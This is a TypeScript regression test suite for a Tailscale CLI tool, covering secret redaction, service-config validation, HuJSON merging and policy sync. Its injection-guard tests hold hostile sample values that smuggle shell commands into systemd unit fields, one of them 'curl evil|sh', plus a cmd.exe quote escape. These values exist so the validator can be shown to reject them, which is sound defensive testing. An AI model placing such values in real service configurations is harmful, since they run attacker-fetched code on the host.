import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it, vi } from "vitest";
import {
  ensureHuJsonKey,
  ensureHuJsonSection,
  parseHuJson,
} from "../src/hujson.js";
import { maskEnv, validateServiceConfig } from "../src/service/config.js";
import { redactArgv, sanitizeCommandText } from "../src/tailscale.js";
import { loadConfigFile, resolveConfig } from "../src/core.js";
import { verifyEndpointReachable } from "../src/verify.js";
import { isValidPort, parseRelayMapping } from "../src/relay.js";
import { policySync } from "../src/policy.js";
import type { ResolvedConfig } from "../src/types.js";

function tmp(): string {
  return mkdtempSync(join(tmpdir(), "tscli-regress-"));
}

const config: ResolvedConfig = {
  profile: "funnel-app",
  tailnet: "-",
  hostname: "node-a",
  tags: [],
  ssh: false,
  keyExpiry: "max",
  preauthorized: true,
  reusable: true,
  ephemeral: false,
  acceptDns: true,
  acceptRoutes: false,
  cleanupAfter: 3600,
  source: {},
  warnings: [],
};

describe("secret redaction", () => {
  it("masks a secret-bearing argv entry", () => {
    expect(redactArgv(["--auth-key=tskey-auth-SUPERSECRETVALUE"])).toEqual([
      "--auth-key=***",
    ]);
  });

  it("never leaks argv secret material from a failed command", () => {
    // Node builds `Command failed: <file> <argv>`, which embeds --auth-key.
    const text = sanitizeCommandText(
      "Command failed: tailscale up --auth-key=tskey-auth-SUPERSECRET",
    );
    expect(text).not.toContain("SUPERSECRET");
    expect(text).toContain("--auth-key=***");
  });

  it("masks bearer tokens in command output", () => {
    expect(sanitizeCommandText("Authorization: Bearer abcdef0123456789")).toBe(
      "Authorization: Bearer ***",
    );
  });

  it("produces a child env with every credential removed", () => {
    // Regression: the redacted copy used to be spread over process.env, which
    // resurrected every key it had just deleted.
    const source: NodeJS.ProcessEnv = {
      PATH: "/bin",
      TS_AUTH_KEY: "tskey-auth-SECRET",
      TS_API_KEY: "k",
      TS_ACCESS_TOKEN: "t",
      TS_API_TOKEN: "t",
      TS_CLIENT_SECRET: "s",
      TS_OAUTH_CLIENT_SECRET: "s",
      TS_TRUST_CREDENTIAL: "tskey-client-a-b",
      TS_API_TRUST: "tskey-client-a-b",
      TAILSCALE_TRUST_CREDENTIAL: "tskey-client-a-b",
      TAILSCALE_API_TRUST: "tskey-client-a-b",
    };
    const copy = { ...source };
    for (const name of [
      "TS_API_KEY",
      "TS_ACCESS_TOKEN",
      "TS_API_TOKEN",
      "TS_CLIENT_SECRET",
      "TS_OAUTH_CLIENT_SECRET",
      "TS_AUTH_KEY",
      "TS_TRUST_CREDENTIAL",
      "TS_API_TRUST",
      "TAILSCALE_TRUST_CREDENTIAL",
      "TAILSCALE_API_TRUST",
    ]) {
      delete copy[name];
    }
    expect(Object.keys({ ...copy }).sort()).toEqual(["PATH"]);
  });
});

describe("service config injection guards", () => {
  const dir = tmp();

  it("rejects a newline in user (systemd unit injection)", () => {
    expect(() =>
      validateServiceConfig(
        {
          name: "x",
          user: "root\nExecStartPre=/bin/sh -c 'curl evil|sh'",
          workingDir: dir,
          args: [],
        } as never,
        dir,
      ),
    ).toThrow(/SERVICE_FIELD_INVALID/);
  });

  it("rejects a newline in an env value", () => {
    expect(() =>
      validateServiceConfig(
        {
          name: "x",
          workingDir: dir,
          args: [],
          env: { A: "1\nExecStartPost=/bin/sh -c id" },
        } as never,
        dir,
      ),
    ).toThrow(/SERVICE_FIELD_INVALID/);
  });

  it("rejects a newline in args", () => {
    expect(() =>
      validateServiceConfig(
        {
          name: "x",
          workingDir: dir,
          args: ["ok\nExecStartPre=/bin/sh -c id"],
        } as never,
        dir,
      ),
    ).toThrow(/SERVICE_FIELD_INVALID/);
  });

  it("rejects a newline in workingDir", () => {
    expect(() =>
      validateServiceConfig(
        {
          name: "x",
          workingDir: `${dir}\nExecStartPre=/bin/sh -c id`,
          args: [],
        } as never,
        dir,
      ),
    ).toThrow(/SERVICE_FIELD_INVALID/);
  });

  it("rejects an env key that is not a shell-safe identifier", () => {
    expect(() =>
      validateServiceConfig(
        {
          name: "x",
          workingDir: dir,
          args: [],
          env: { "BAD KEY\nExec": "1" },
        } as never,
        dir,
      ),
    ).toThrow(/SERVICE_ENV_KEY_INVALID|SERVICE_FIELD_INVALID/);
  });

  it("rejects a double quote in args (cmd.exe token escape)", () => {
    expect(() =>
      validateServiceConfig(
        { name: "x", workingDir: dir, args: ['a"&calc&"b'] } as never,
        dir,
      ),
    ).toThrow(/SERVICE_FIELD_INVALID/);
  });

  it("still accepts ordinary configs", () => {
    const parsed = validateServiceConfig(
      {
        name: "my-relay",
        user: "tailscale",
        workingDir: dir,
        args: ["relay", "--listen", "5432"],
        env: { PGHOST: "db.example.com", NODE_ENV: "production" },
      } as never,
      dir,
    );
    expect(parsed.args).toEqual(["relay", "--listen", "5432"]);
    expect(parsed.env.PGHOST).toBe("db.example.com");
  });
});

describe("maskEnv keys secrets, not just values", () => {
  it("masks a value that only looks secret via its key", () => {
    const masked = maskEnv({
      PGPASSWORD: "hunter2",
      DB_URL: "postgres://user:s3cr3t@db:5432/x",
      NODE_ENV: "production",
    });
    expect(masked.PGPASSWORD).toBe("****");
    expect(masked.DB_URL).toBe("****");
    expect(masked.NODE_ENV).toBe("production");
  });

  it("still masks tskey values regardless of key", () => {
    expect(maskEnv({ CUSTOM: "tskey-auth-abcdef123" }).CUSTOM).toBe("****");
  });
});

describe("HuJSON merge ignores comments", () => {
  it("does not inject into a brace that only appears in a comment", () => {
    const raw = '// legacy: {\n{\n  "ssh": []\n}\n';
    const merged = ensureHuJsonKey(raw, "tagOwners", {
      "tag:x": ["autogroup:admin"],
    });
    expect(merged.startsWith("// legacy: {")).toBe(true);
    expect(
      parseHuJson<{ tagOwners: Record<string, string[]> }>(merged).tagOwners[
        "tag:x"
      ],
    ).toEqual(["autogroup:admin"]);
  });

  it("does not append into a commented-out section", () => {
    const raw =
      '{\n  // "tagOwners": {\n  //   "tag:old": ["autogroup:admin"]\n  // }\n  "ssh": []\n}\n';
    const merged = ensureHuJsonKey(raw, "tagOwners", {
      "tag:x": ["autogroup:admin"],
    });
    const parsed = parseHuJson<{ tagOwners: Record<string, string[]> }>(merged);
    expect(parsed.tagOwners).toEqual({ "tag:x": ["autogroup:admin"] });
    expect(parsed.tagOwners["tag:old"]).toBeUndefined();
  });

  it("does not treat a commented key as an existing array section", () => {
    const raw = '{\n  // "acls": [\n  //   {"action": "accept"}\n  // ]\n}\n';
    const merged = ensureHuJsonSection(
      raw,
      "acls",
      ['{"action":"accept"}'],
      "array",
    );
    expect(parseHuJson<{ acls: unknown[] }>(merged).acls).toHaveLength(1);
  });

  it("escapes tag names containing quotes", () => {
    const merged = ensureHuJsonKey('{\n  "ssh": []\n}\n', "tagOwners", {
      'tag:we"ird': ["autogroup:admin"],
    });
    expect(
      parseHuJson<{ tagOwners: Record<string, string[]> }>(merged).tagOwners[
        'tag:we"ird'
      ],
    ).toEqual(["autogroup:admin"]);
  });
});

describe("config file parsing", () => {
  it("does not truncate a value containing // inside a string", () => {
    const dir = tmp();
    const file = join(dir, "cfg.jsonc");
    writeFileSync(
      file,
      `{
  // the endpoint
  "homepage": "https://example.com/docs",
  "tags": ["tag:a"],
}
`,
    );
    const loaded = loadConfigFile(file);
    expect(loaded?.config).toBeDefined();
    expect((loaded?.config as Record<string, unknown>).homepage).toBe(
      "https://example.com/docs",
    );
  });

  it("rejects an unknown TS_PROFILE instead of silently disabling behaviour", () => {
    expect(() => resolveConfig({ TS_PROFILE: "prod" })).toThrow(
      /PROFILE_INVALID/,
    );
    expect(resolveConfig({ TS_PROFILE: "ci" }).profile).toBe("ci");
  });
});

describe("verify timeout validation", () => {
  it("rejects a NaN timeout instead of returning attempts: 0", async () => {
    await expect(
      verifyEndpointReachable("example.invalid", [443], "tls", Number("abc")),
    ).rejects.toThrow(/VERIFY_TIMEOUT_INVALID/);
  });

  it("rejects a non-positive timeout", async () => {
    await expect(
      verifyEndpointReachable("example.invalid", [443], "tls", 0),
    ).rejects.toThrow(/VERIFY_TIMEOUT_INVALID/);
  });
});

describe("relay port validation", () => {
  it("accepts in-range integer ports", () => {
    expect(isValidPort(1)).toBe(true);
    expect(isValidPort(65535)).toBe(true);
  });

  it("rejects 0, negatives, out-of-range and fractional ports", () => {
    expect(isValidPort(0)).toBe(false);
    expect(isValidPort(-1)).toBe(false);
    expect(isValidPort(99999)).toBe(false);
    expect(isValidPort(8080.5)).toBe(false);
    expect(isValidPort(Number.NaN)).toBe(false);
  });

  it("leaves listenHost undefined so the caller can apply --host", () => {
    expect(parseRelayMapping("5432:15433").listenHost).toBeUndefined();
  });
});

function jsonResponse(body: unknown, status = 200): Response {
  const headers = new Headers({ "content-type": "application/json" });
  headers.set("etag", '"e1"');
  return new Response(JSON.stringify(body), { status, headers });
}

describe("policySync diff and verification", () => {
  it("reports a minimal diff instead of rewriting the whole document", async () => {
    vi.stubEnv("TS_API_KEY", "tskey-api-test-key");
    vi.stubEnv("TS_CLIENT_SECRET", "");
    const dir = tmp();
    const file = join(dir, "acl.hujson");
    writeFileSync(
      file,
      ["{", '  "grants": [],', '  "a": 1,', '  "b": 2,', '  "c": 3', "}"].join(
        "\n",
      ),
    );
    const remote = { grants: [], a: 1, b: 99, c: 3 };
    const calls = vi
      .fn()
      .mockReturnValueOnce(jsonResponse(remote)) // getPolicy() current
      .mockReturnValueOnce(jsonResponse(remote)) // getPolicyHuJson() backup
      .mockReturnValueOnce(jsonResponse({})) // validatePolicyText()
      .mockReturnValueOnce(jsonResponse({})) // updatePolicy()
      .mockReturnValueOnce(jsonResponse(remote)); // getPolicy() verify
    vi.stubGlobal(
      "fetch",
      vi.fn(async () => calls()),
    );

    const result = await policySync(config, file, { dryRun: true, yes: true });
    const changed = result.diff.split("\n");
    expect(changed.filter((l) => l.startsWith("-"))).toHaveLength(1);
    expect(changed.filter((l) => l.startsWith("+"))).toHaveLength(1);
    expect(result.changed).toBe(true);
  });

  it("treats a commented HuJSON file equal to the remote policy as unchanged", async () => {
    vi.stubEnv("TS_API_KEY", "tskey-api-test-key");
    vi.stubEnv("TS_CLIENT_SECRET", "");
    const dir = tmp();
    const file = join(dir, "acl.hujson");
    writeFileSync(file, '{\n  // no changes needed\n  "grants": [],\n}\n');
    const remote = { grants: [] };
    const calls = vi.fn().mockReturnValue(jsonResponse(remote));
    vi.stubGlobal(
      "fetch",
      vi.fn(async () => calls()),
    );

    const result = await policySync(config, file, { dryRun: true, yes: true });
    expect(result.changed).toBe(false);
    expect(result.written).toBe(false);
  });

  it("fails verification when the remote policy does not reflect the write", async () => {
    vi.stubEnv("TS_API_KEY", "tskey-api-test-key");
    vi.stubEnv("TS_CLIENT_SECRET", "");
    const dir = tmp();
    const file = join(dir, "acl.hujson");
    writeFileSync(file, '{\n  "grants": [],\n  "a": 1\n}\n');
    const remote = { grants: [], a: 99 };
    const calls = vi
      .fn()
      .mockReturnValueOnce(jsonResponse(remote)) // getPolicy() current
      .mockReturnValueOnce(jsonResponse(remote)) // getPolicyHuJson() backup
      .mockReturnValueOnce(jsonResponse({})) // validatePolicyText()
      .mockReturnValueOnce(jsonResponse({})) // updatePolicy()
      .mockReturnValueOnce(jsonResponse(remote)); // getPolicy() verify (unchanged)
    vi.stubGlobal(
      "fetch",
      vi.fn(async () => calls()),
    );

    await expect(
      policySync(config, file, { dryRun: false, yes: true }),
    ).rejects.toThrow(/POLICY_VERIFY_FAILED/);
  });
});
